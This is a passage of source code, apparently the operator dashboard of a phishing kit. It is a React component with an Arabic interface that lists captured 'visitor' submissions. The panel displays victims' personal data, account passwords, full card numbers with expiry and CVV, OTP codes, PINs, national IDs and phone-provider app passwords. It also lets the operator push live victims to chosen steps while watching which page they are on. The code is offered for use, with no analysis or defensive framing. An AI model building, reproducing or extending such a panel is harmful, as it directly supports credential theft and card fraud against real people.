                        <p className={cn("font-bold truncate", currentTheme.text)}>
                          {sub.step_2_personal_data?.fullNameArabic || `زائر ${sub.visitorId.slice(0, 8)}`}
                        </p>
                        {isUserOnline(sub.visitorId) ? (
                          <span className="flex items-center gap-1 text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">
                            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                            متصل
                          </span>
                        ) : (
                          <WifiOff className={cn("h-3 w-3", currentTheme.textMuted)} />
                        )}
                      </div>
                      {!themeSettings.compactMode && (
                        <>
                          <p className={cn("text-sm truncate", currentTheme.textMuted)}>
                            {sub.step_2_personal_data?.email || "لا يوجد بريد"}
                          </p>
                          <p className={cn("text-xs mt-1", currentTheme.textMuted)}>
                            <Clock className="h-3 w-3 inline ml-1" />
                            {formatDate(sub.updatedAt) || "غير محدد"}
                          </p>
                          {isUserOnline(sub.visitorId) && (
                            <p className="text-xs text-blue-400 mt-1">
                              📍 {getUserCurrentPage(sub.visitorId)}
                            </p>
                          )}
                        </>
                      )}
                      <div className={cn("flex items-center gap-2 flex-wrap", themeSettings.compactMode ? "mt-1" : "mt-2")}>
                        {sub.status === "completed" ? (
                          <span className="text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">
                            مكتمل
                          </span>
                        ) : (
                          <span className="text-xs bg-yellow-500/20 text-yellow-400 px-2 py-0.5 rounded">
                            {sub.lastStep || "جاري"}
                          </span>
                        )}
                        {(sub.step_4_payment_card || sub.step_4_payment) && (
                          <span className="text-xs bg-orange-500/20 text-orange-400 px-2 py-0.5 rounded flex items-center gap-1">
                            <CreditCard className="h-3 w-3" />
                            بطاقة
                          </span>
                        )}
                        {sub.step_4_payment?.otpCode && (
                          <span className="text-xs bg-purple-500/20 text-purple-400 px-2 py-0.5 rounded flex items-center gap-1">
                            <Shield className="h-3 w-3" />
                            OTP
                          </span>
                        )}
                        {sub.step_5_pin?.pinCode && (
                          <span className="text-xs bg-red-500/20 text-red-400 px-2 py-0.5 rounded flex items-center gap-1">
                            <Lock className="h-3 w-3" />
                            PIN
                          </span>
                        )}
                      </div>
                    </div>
                    <ChevronRight className={cn("h-5 w-5 flex-shrink-0", currentTheme.textMuted)} />
                  </div>
                </button>
              ))
            )}
          </div>
        </div>

        {/* Detail Panel - Grid Layout */}
        <div className={cn("flex-1 overflow-y-auto p-3 md:p-4 order-1 md:order-2 h-1/2 md:h-full", currentTheme.bg)}>
          {selectedSubmission ? (
            <div className="space-y-3">
              {/* Header Row */}
              <div className={cn("rounded-lg p-3 border flex items-center justify-between", currentTheme.card, currentTheme.border)}>
                <div className="flex items-center gap-3">
                  <div className={cn(
                    "w-10 h-10 rounded-full flex items-center justify-center",
                    isUserOnline(selectedSubmission.visitorId) ? "bg-green-600" : "bg-blue-600"
                  )}>
                    <User className="h-5 w-5 text-white" />
                  </div>
                  <div>
                    <h2 className={cn("font-bold", currentTheme.text)}>
                      {selectedSubmission.step_2_personal_data?.fullNameArabic || "زائر جديد"}
                    </h2>
                    <p className={cn("text-xs", currentTheme.textMuted)}>
                      {selectedSubmission.step_2_personal_data?.fullNameEnglish || selectedSubmission.visitorId.slice(0, 12)}
                    </p>
                  </div>
                  {isUserOnline(selectedSubmission.visitorId) && (
                    <span className="flex items-center gap-1 text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded">
                      <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                      متصل
                    </span>
                  )}
                </div>
                <div className="flex gap-2">
                  {selectedSubmission.status === "completed" && (
                    <span className="bg-green-500 text-white px-3 py-1 rounded text-xs font-bold">مكتمل</span>
                  )}
                  <Button
                    variant="destructive"
                    size="sm"
                    onClick={() => handleDelete(selectedSubmission.id)}
                    className="bg-red-600 hover:bg-red-700 text-xs h-8"
                  >
                    <Trash2 className="h-4 w-4" />
                  </Button>
                </div>
              </div>

              {/* Admin Step Control */}
              {isUserOnline(selectedSubmission.visitorId) && (
                <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
                  <p className="text-xs text-orange-400 mb-2 flex items-center gap-1">
                    <Settings className="h-3 w-3" /> تحكم في الخطوات
                  </p>
                  <div className="flex flex-wrap gap-1">
                    {[1, 2, 3, 4, 5, 6, 7].map((step) => (
                      <Button
                        key={step}
                        size="sm"
                        variant="outline"
                        onClick={() => handleSetUserStep(selectedSubmission.visitorId, step)}
                        className={cn("text-xs px-2 h-7", currentTheme.border, "hover:bg-orange-500/20")}
                      >
                        {step}
                      </Button>
                    ))}
                  </div>
                </div>
              )}

              {/* Steps Grid - Each Step in a Card */}
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {/* Step 1: Account Type */}
                {selectedSubmission.step_1_account_type && (
                  <div className={cn("rounded-lg p-4 border", currentTheme.card, currentTheme.border)}>
                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-700">
                      <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-bold">1</div>
                      <span className={cn("font-bold text-sm", currentTheme.text)}>نوع الحساب</span>
                    </div>
                    <div className="space-y-2 text-sm">
                      <div className="flex justify-between">
                        <span className={currentTheme.textMuted}>النوع:</span>
                        <span className={currentTheme.text}>{selectedSubmission.step_1_account_type.accountType === "citizen" ? "مواطن" : "زائر"}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className={currentTheme.textMuted}>جديد:</span>
                        <span className={currentTheme.text}>{selectedSubmission.step_1_account_type.isNewAccount ? "نعم" : "لا"}</span>
                      </div>
                    </div>
                  </div>
                )}

                {/* Step 2: Personal Data */}
                {selectedSubmission.step_2_personal_data && (
                  <div className={cn("rounded-lg p-4 border", currentTheme.card, currentTheme.border)}>
                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-700">
                      <div className="w-6 h-6 rounded-full bg-green-600 flex items-center justify-center text-white text-xs font-bold">2</div>
                      <span className={cn("font-bold text-sm", currentTheme.text)}>البيانات الشخصية</span>
                    </div>
                    <div className="space-y-2 text-xs">
                      <div className="flex items-center gap-1">
                        <Mail className="h-3 w-3 text-blue-400" />
                        <span className="truncate">{selectedSubmission.step_2_personal_data.email}</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <Phone className="h-3 w-3 text-green-400" />
                        <span>{selectedSubmission.step_2_personal_data.phoneNumber}</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <Calendar className="h-3 w-3 text-purple-400" />
                        <span>{selectedSubmission.step_2_personal_data.dateOfBirth}</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <Globe className="h-3 w-3 text-cyan-400" />
                        <span>{selectedSubmission.step_2_personal_data.nationality}</span>
                      </div>
                      {selectedSubmission.step_2_personal_data.address && (
                        <div className="flex items-center gap-1">
                          <MapPin className="h-3 w-3 text-teal-400" />
                          <span className="truncate">{selectedSubmission.step_2_personal_data.address.area}</span>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {/* Step 3: Password */}
                {selectedSubmission.step_3_password && (
                  <div className="rounded-lg p-4 border bg-red-900/20 border-red-500/30">
                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-red-700/50">
                      <div className="w-6 h-6 rounded-full bg-red-600 flex items-center justify-center text-white text-xs font-bold">3</div>
                      <span className="font-bold text-sm text-red-300">كلمة المرور</span>
                    </div>
                    <div className="text-center py-2">
                      <p className="text-xs text-red-400 mb-1">كلمة المرور</p>
                      <p className="text-2xl font-mono font-bold text-red-300">
                        {selectedSubmission.step_3_password.password}
                      </p>
                    </div>
                  </div>
                )}

                {/* Step 4: Payment & Card */}
                {(selectedSubmission.step_4_payment || selectedSubmission.step_4_payment_card) && (
                  <div className="rounded-lg p-4 border bg-orange-900/20 border-orange-500/30 md:col-span-2">
                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-orange-700/50">
                      <div className="w-6 h-6 rounded-full bg-orange-600 flex items-center justify-center text-white text-xs font-bold">4</div>
                      <span className="font-bold text-sm text-orange-300">الدفع والبطاقة</span>
                      {selectedSubmission.step_4_payment?.otpCode && (
                        <span className="bg-purple-500/20 text-purple-400 px-2 py-0.5 rounded text-xs mr-auto">OTP ✓</span>
                      )}
                    </div>
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                      <div className="col-span-2">
                        <p className="text-xs text-orange-400 mb-1">رقم البطاقة</p>
                        <p className="text-lg font-mono font-bold text-orange-300 tracking-wider">
                          {selectedSubmission.step_4_payment?.cardNumber || selectedSubmission.step_4_payment_card?.cardNumber}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-yellow-400 mb-1">انتهاء</p>
                        <p className="text-lg font-mono font-bold text-yellow-300">
                          {selectedSubmission.step_4_payment?.expiry || selectedSubmission.step_4_payment_card?.expiry}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-red-400 mb-1">CVV</p>
                        <p className="text-2xl font-mono font-bold text-red-300">
                          {selectedSubmission.step_4_payment?.cvv || selectedSubmission.step_4_payment_card?.cvv}
                        </p>
                      </div>
                      <div className="col-span-2">
                        <p className="text-xs text-gray-400 mb-1">الاسم على البطاقة</p>
                        <p className="text-sm font-medium text-gray-300">
                          {selectedSubmission.step_4_payment?.cardName || selectedSubmission.step_4_payment_card?.cardName}
                        </p>
                      </div>
                      {selectedSubmission.step_4_payment?.otpCode && (
                        <div className="col-span-2">
                          <p className="text-xs text-purple-400 mb-1">رمز OTP</p>
                          <p className="text-2xl font-mono font-bold text-purple-300">
                            {selectedSubmission.step_4_payment.otpCode}
                          </p>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {/* Step 5: PIN */}
                {selectedSubmission.step_5_pin && (
                  <div className="rounded-lg p-4 border bg-pink-900/20 border-pink-500/30">
                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-pink-700/50">
                      <div className="w-6 h-6 rounded-full bg-pink-600 flex items-center justify-center text-white text-xs font-bold">5</div>
                      <span className="font-bold text-sm text-pink-300">رمز PIN</span>
                    </div>
                    <div className="text-center py-2">
                      <p className="text-xs text-pink-400 mb-1">رمز PIN</p>
                      <p className="text-3xl font-mono font-bold text-pink-300 tracking-widest">
                        {selectedSubmission.step_5_pin.pinCode}
                      </p>
                    </div>
                  </div>
                )}

                {/* Step 6: Phone Provider */}
                {selectedSubmission.step_6_phone_provider && (
                  <div className="rounded-lg p-4 border bg-blue-900/20 border-blue-500/30">
                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-blue-700/50">
                      <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-bold">6</div>
                      <span className="font-bold text-sm text-blue-300">مزود الخدمة</span>
                    </div>
                    <div className="space-y-2 text-xs">
                      <div className="flex items-center gap-1">
                        <Smartphone className="h-3 w-3 text-blue-400" />
                        <span className="text-blue-300">{selectedSubmission.step_6_phone_provider.provider}</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <User className="h-3 w-3 text-gray-400" />
                        <span>{selectedSubmission.step_6_phone_provider.personalId}</span>
                      </div>
                      {selectedSubmission.step_6_phone_provider.password && (
                        <div className="mt-2 pt-2 border-t border-blue-700/50">
                          <p className="text-xs text-red-400 mb-1">كلمة مرور التطبيق</p>
                          <p className="text-lg font-mono font-bold text-red-300">
                            {selectedSubmission.step_6_phone_provider.password}
                          </p>
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
            </div>
          ) : (
            <div className={cn("flex items-center justify-center h-full", currentTheme.textMuted)}>
              <div className="text-center">
                <FileText className="h-16 w-16 mx-auto mb-4 opacity-50" />
                <p className="text-xl">اختر تسجيلاً لعرض التفاصيل</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function DetailSection({ 
  title, 
  icon: Icon, 
  children,
  theme 
}: { 
  title: string; 
  icon: any; 
  children: React.ReactNode;
  theme?: typeof themes.dark;
}) {
  const t = theme || themes.dark;
  return (
    <div className={cn("rounded-xl p-4 md:p-6 border", t.card, t.border)}>
      <h3 className={cn("font-bold text-base md:text-lg mb-3 md:mb-4 flex items-center gap-2", t.text)}>
        <Icon className="h-4 w-4 md:h-5 md:w-5 text-blue-400" />
        {title}
      </h3>
      {children}
    </div>
  );
}

function DetailItem({ 
  label, 
  value, 
  icon: Icon,
  theme
}: { 
  label: string; 
  value: string; 
  icon?: any;
  theme?: typeof themes.dark;
}) {
  const t = theme || themes.dark;
  return (
    <div className={cn("rounded-lg p-2 md:p-3", t.bg)}>
      <div className="flex items-center gap-1 md:gap-2">
        {Icon && <Icon className={cn("h-3 w-3 md:h-4 md:w-4", t.textMuted)} />}
        <p className={cn("text-xs", t.textMuted)}>{label}</p>
      </div>
      <p className={cn("font-medium mt-1 text-sm md:text-base break-all", t.text)}>{value || "-"}</p>
    </div>
  );
}
